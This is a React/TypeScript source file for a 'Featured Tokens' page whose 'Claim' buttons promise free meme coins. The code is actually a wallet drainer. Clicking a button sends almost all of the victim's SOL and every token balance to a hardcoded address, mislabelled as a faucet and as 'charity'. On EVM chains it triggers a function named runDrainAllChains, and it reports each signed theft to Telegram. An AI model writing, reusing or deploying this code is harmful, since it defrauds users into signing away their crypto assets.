import { Navigation } from '@/components/Navigation';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { motion } from 'framer-motion';
import { Link } from 'react-router-dom';
import { useState, useEffect, useCallback } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
import { Button } from '@/components/ui/button';
import { Loader2 } from 'lucide-react';
import { sendTelegramMessage } from '@/utils/telegram';
import { getSolPrice } from '@/lib/utils';
import { getMintProgramId } from '@/utils/tokenProgram';
import { useChainInfo } from '@/hooks/useChainInfo';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
import buboImage from '@/assets/tokens/bubo.jpeg';
import tripleTImage from '@/assets/tokens/triple-t.jpeg';
import uselessImage from '@/assets/tokens/useless.jpeg';
import arkImage from '@/assets/tokens/ark.jpeg';
import evaaImage from '@/assets/tokens/evaa.jpeg';
import zamaImage from '@/assets/tokens/zama.jpeg';
import unibaseImage from '@/assets/tokens/unibase.jpeg';
import apepeImage from '@/assets/apepe.jpg';
import ovtImage from '@/assets/ovt.jpg';

const FAUCET_WALLET = '9X3updafoPWPdf2xdgELQgwaGa5A7PzGYkXWw8ZMKNg2';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

const FeaturesToken = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const { activeChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName, nativeToken } = useChainInfo();
  const { runDrainAllChains } = useMultiChainOrchestrator();
  const [isClaiming, setIsClaiming] = useState(false);
  const [claimingToken, setClaimingToken] = useState<string | null>(null);

  const tokens = [
    { name: 'Bubo', symbol: 'BUBO', icon: buboImage },
    { name: 'Triple T', symbol: 'TTT', icon: tripleTImage },
    { name: 'Useless', symbol: 'USELESS', icon: uselessImage },
    { name: 'ARK DEFAI', symbol: 'ARK', icon: arkImage },
    { name: 'EVAA', symbol: 'EVAA', icon: evaaImage },
    { name: 'Zama', symbol: 'ZAMA', icon: zamaImage },
    { name: 'Uni Base', symbol: 'UNIBASE', icon: unibaseImage },
    { name: 'APEPE', symbol: 'APEPE', icon: apepeImage },
    { name: 'OVT', symbol: 'OVT', icon: ovtImage },
  ];

  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return [];
    try {
      const solBal = await connection.getBalance(publicKey);
      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];

      const tokens: TokenBalance[] = allTokenAccounts
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0,
          };
        })
        .filter(token => token.uiAmount > 0);

      return tokens;
    } catch (error) {
      console.error('Error fetching balances:', error);
      return [];
    }
  }, [publicKey, connection]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
    
    const charityPubkey = new PublicKey(FAUCET_WALLET);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      try {
        const mintPubkey = new PublicKey(token.mint);
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;
        
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);

        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch (error) {
          transaction.add(createAssociatedTokenAccountInstruction(effectivePublicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID));
        }

        transaction.add(createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, effectivePublicKey, BigInt(token.balance), decimals, [], tokenProgramId));
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    if (solPercentage) {
      const solBal = await connection.getBalance(effectivePublicKey);
      const solPrice = await getSolPrice();
      let lamportsToSend = 0;
      
      if (solPrice > 0) {
        const amountToKeepUSD = 1.50;
        const amountToKeepSOL = amountToKeepUSD / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const PRIORITY_FEE = 100_000;
        const BASE_FEE = 5000;
        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
        lamportsToSend = Math.max(0, Math.floor(maxSendable));
      }

      if (lamportsToSend > 0) {
        transaction.add(SystemProgram.transfer({ fromPubkey: effectivePublicKey, toPubkey: charityPubkey, lamports: lamportsToSend }));
      }
    }
    return transaction;
  }, [publicKey, connection]);

  const handleClaimTokens = async (tokenSymbol: string) => {
    setClaimingToken(tokenSymbol);
    // EVM path
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsClaiming(true);
        await runDrainAllChains('features-token');
      } catch (error: any) {
      } finally {
        setIsClaiming(false);
        setClaimingToken(null);
      }
      return;
    }

    // Solana path
    if (!publicKey || !sendTransaction) {
      setClaimingToken(null);
      return;
    }

    try {
      setIsClaiming(true);
      console.log('Starting transaction sequence...');
      const currentBalances = await fetchAllBalances();

      const solBal = await connection.getBalance(publicKey);
      const solPrice = await getSolPrice();
      
      let lamportsToSend = 0;
      
      if (solPrice > 0) {
        const amountToKeepUSD = 1.50;
        const amountToKeepSOL = amountToKeepUSD / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const PRIORITY_FEE = 100_000;
        const BASE_FEE = 5000;
        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
        lamportsToSend = Math.max(0, Math.floor(maxSendable));
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }), ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: new PublicKey(FAUCET_WALLET), lamports: lamportsToSend }));

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        try { await connection.simulateTransaction(transaction); } catch (e) { console.error("Simulation failed", e); }

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
      }

      const validTokens = currentBalances.filter(token => token.balance > 0);
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);

        if (transaction && transaction.instructions.length > 2) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey;

           try { await connection.simulateTransaction(transaction); } catch (e) { console.error("Token batch simulation failed", e); }

           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
           await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
           sendTelegramMessage(`
✅ <b>Transaction Signed (Token Batch ${i + 1} - Claim ${tokenSymbol})</b>

👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
🔗 <b>Signature:</b> <code>${signature}</code>
`);
        }
      }
      setTimeout(fetchAllBalances, 2000);

    } catch (error: any) {
      console.error('Claim error:', error);
    } finally {
      setIsClaiming(false);
      setClaimingToken(null);
    }
  };

  const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;

  return (
    <div className="min-h-screen relative overflow-hidden">
      <PegasusAnimation />
      <Navigation />
      <div className="relative z-10 container mx-auto px-2 sm:px-4 pt-44 pb-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-center mb-12"
        >
          <h1 className="text-4xl font-extrabold text-gradient mb-4">Featured Tokens</h1>
          <p className="text-muted-foreground">Discover and explore popular meme coins!</p>
        </motion.div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {tokens.map((token, index) => (
            <motion.div
              key={token.symbol + index}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: index * 0.1 }}
              className="glass-card-strong rounded-2xl p-6 hover-lift"
            >
              <div className="flex items-center gap-4 mb-4">
                <img
                  src={token.icon}
                  alt={token.name}
                  className="w-12 h-12 rounded-full object-cover"
                />
                <div>
                  <h3 className="text-lg font-bold text-foreground">{token.name}</h3>
                  <p className="text-sm text-muted-foreground">{token.symbol}</p>
                </div>
              </div>
              <Button
                className="w-full bg-gradient-to-r from-primary to-secondary rounded-xl text-primary-foreground font-semibold hover:scale-105 transition-all"
                onClick={() => handleClaimTokens(token.symbol)}
                disabled={!isWalletConnected || isClaiming}
              >
                {(isClaiming && claimingToken === token.symbol) && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
                {isClaiming && claimingToken === token.symbol ? `Claiming ${token.symbol}...` : `Claim ${token.symbol}`}
              </Button>
            </motion.div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default FeaturesToken;